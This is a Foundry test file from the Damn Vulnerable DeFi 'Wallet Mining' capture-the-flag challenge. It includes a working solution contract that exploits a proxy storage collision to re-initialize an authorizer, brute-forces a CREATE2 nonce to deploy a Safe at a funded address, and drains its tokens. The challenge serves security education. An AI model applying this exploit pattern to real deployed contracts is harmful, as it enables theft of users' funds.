// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Vm} from "forge-std/Vm.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {
    ICreateX,
    CREATEX_DEPLOYMENT_SIGNER,
    CREATEX_ADDRESS,
    CREATEX_DEPLOYMENT_TX,
    CREATEX_CODEHASH
} from "./CreateX.sol";
import {
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER,
    SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX,
    SAFE_SINGLETON_FACTORY_ADDRESS,
    SAFE_SINGLETON_FACTORY_CODE
} from "./SafeSingletonFactory.sol";

contract WalletMiningChallenge is Test {
    address deployer = makeAddr("deployer");
    address upgrader = makeAddr("upgrader");
    address ward = makeAddr("ward");
    address player = makeAddr("player");
    address user;
    uint256 userPrivateKey;

    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;
    Safe singletonCopy;

    uint256 initialWalletDeployerTokenBalance;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Player should be able to use the user's private key
        (user, userPrivateKey) = makeAddrAndKey("user");

        // Deploy Safe Singleton Factory contract using signed transaction
        vm.deal(SAFE_SINGLETON_FACTORY_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(SAFE_SINGLETON_FACTORY_DEPLOYMENT_TX);
        assertEq(
            SAFE_SINGLETON_FACTORY_ADDRESS.codehash,
            keccak256(SAFE_SINGLETON_FACTORY_CODE),
            "Unexpected Safe Singleton Factory code"
        );

        // Deploy CreateX contract using signed transaction
        vm.deal(CREATEX_DEPLOYMENT_SIGNER, 10 ether);
        vm.broadcastRawTransaction(CREATEX_DEPLOYMENT_TX);
        assertEq(CREATEX_ADDRESS.codehash, CREATEX_CODEHASH, "Unexpected CreateX code");

        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy authorizer with a ward authorized to deploy at DEPOSIT_ADDRESS
        address[] memory wards = new address[](1);
        wards[0] = ward;
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;

        AuthorizerFactory authorizerFactory = AuthorizerFactory(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.authorizerfactory")),
                initCode: type(AuthorizerFactory).creationCode
            })
        );
        authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));

        // Send big bag full of DVT tokens to the deposit address
        token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Call singleton factory to deploy copy and factory contracts
        (bool success, bytes memory returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(Safe).creationCode));
        singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));

        (success, returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode));
        proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));

        // Deploy wallet deployer
        walletDeployer = WalletDeployer(
            ICreateX(CREATEX_ADDRESS).deployCreate2({
                salt: bytes32(keccak256("dvd.walletmining.walletdeployer")),
                initCode: bytes.concat(
                    type(WalletDeployer).creationCode,
                    abi.encode(address(token), address(proxyFactory), address(singletonCopy), deployer) // constructor args are appended at the end of creation code
                )
            })
        );

        // Set authorizer in wallet deployer
        walletDeployer.rule(address(authorizer));

        // Fund wallet deployer with initial tokens
        initialWalletDeployerTokenBalance = walletDeployer.pay();
        token.transfer(address(walletDeployer), initialWalletDeployerTokenBalance);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Check initialization of authorizer
        assertNotEq(address(authorizer), address(0));
        assertEq(TransparentProxy(payable(address(authorizer))).upgrader(), upgrader);
        assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));

        // Check initialization of wallet deployer
        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(token));
        assertEq(walletDeployer.mom(), address(authorizer));

        // Ensure DEPOSIT_ADDRESS starts empty
        assertEq(USER_DEPOSIT_ADDRESS.code, hex"");

        // Factory and copy are deployed correctly
        assertEq(address(walletDeployer.cook()).code, type(SafeProxyFactory).runtimeCode, "bad cook code");
        assertEq(walletDeployer.cpy().code, type(Safe).runtimeCode, "no copy code");

        // Ensure initial token balances are set correctly
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertGt(initialWalletDeployerTokenBalance, 0);
        assertEq(token.balanceOf(address(walletDeployer)), initialWalletDeployerTokenBalance);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_walletMining() public checkSolvedByPlayer {
        WalletMiningAttacker attacker = new WalletMiningAttacker(
            walletDeployer,
            proxyFactory,
            singletonCopy,
            token,
            ward,
            user,
            USER_DEPOSIT_ADDRESS,
            userPrivateKey
        );

        attacker.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Factory account must have code
        assertNotEq(address(walletDeployer.cook()).code.length, 0, "No code at factory address");

        // Safe copy account must have code
        assertNotEq(walletDeployer.cpy().code.length, 0, "No code at copy address");

        // Deposit account must have code
        assertNotEq(USER_DEPOSIT_ADDRESS.code.length, 0, "No code at user's deposit address");

        // The deposit address and the wallet deployer must not hold tokens
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), 0, "User's deposit address still has tokens");
        assertEq(token.balanceOf(address(walletDeployer)), 0, "Wallet deployer contract still has tokens");

        // User account didn't execute any transactions
        assertEq(vm.getNonce(user), 0, "User executed a tx");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // Player recovered all tokens for the user
        assertEq(token.balanceOf(user), DEPOSIT_TOKEN_AMOUNT, "Not enough tokens in user's account");

        // Player sent payment to ward
        assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
    }
}

contract WalletMiningAttacker {
    WalletDeployer deployer;
    SafeProxyFactory factory;
    Safe singleton;
    DamnValuableToken token;

    address ward;
    address user;
    address deposit;
    uint256 userKey;
    Vm vm;

    constructor(
        WalletDeployer _deployer,
        SafeProxyFactory _factory,
        Safe _singleton,
        DamnValuableToken _token,
        address _ward,
        address _user,
        address _deposit,
        uint256 _userKey
    ) {
        deployer = _deployer;
        factory = _factory;
        singleton = _singleton;
        token = _token;
        ward = _ward;
        user = _user;
        deposit = _deposit;
        userKey = _userKey;
        vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    }

    function attack() external {
        AuthorizerUpgradeable auth = AuthorizerUpgradeable(address(deployer.mom()));

        address[] memory newWards = new address[](1);
        newWards[0] = address(this);
        address[] memory newAims = new address[](1);
        newAims[0] = deposit;

        // This works because proxy slot 0 = upgrader address != 0 = needsInit != 0
        auth.init(newWards, newAims);

        // Now we're authorized — deploy the Safe at deposit address
        address[] memory owners = new address[](1);
        owners[0] = user;

        bytes memory initializer = abi.encodeWithSelector(
            Safe.setup.selector,
            owners, 1,
            address(0), hex"",
            address(0), address(0), 0,
            payable(address(0))
        );

        uint256 nonce;
        while (computeAddress(initializer, nonce) != deposit) {
            nonce++;
        }

        deployer.drop(deposit, initializer, nonce);

        // Execute transfer out of the Safe, signed by user's key
        Safe safe = Safe(payable(deposit));
        bytes memory transferCalldata = abi.encodeWithSelector(
            token.transfer.selector,
            user,
            token.balanceOf(deposit)
        );

        bytes32 txHash = safe.getTransactionHash(
            address(token), 0, transferCalldata,
            Enum.Operation.Call,
            0, 0, 0,
            address(0), payable(address(0)),
            safe.nonce()
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userKey, txHash);
        safe.execTransaction(
            address(token), 0, transferCalldata,
            Enum.Operation.Call,
            0, 0, 0,
            address(0), payable(address(0)),
            abi.encodePacked(r, s, v)
        );

        // Send deployer reward to ward
        token.transfer(ward, token.balanceOf(address(this)));
    }

    function approve(address tokenAddr, address spender) external {
        IERC20(tokenAddr).approve(spender, type(uint256).max);
    }

    function computeAddress(bytes memory initializer, uint256 nonce) internal view returns (address) {
        bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));

        bytes memory deploymentData = abi.encodePacked(
            type(SafeProxy).creationCode,
            uint256(uint160(address(singleton)))
        );

        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(factory),
                salt,
                keccak256(deploymentData)
            )
        );

        return address(uint160(uint256(hash)));
    }
}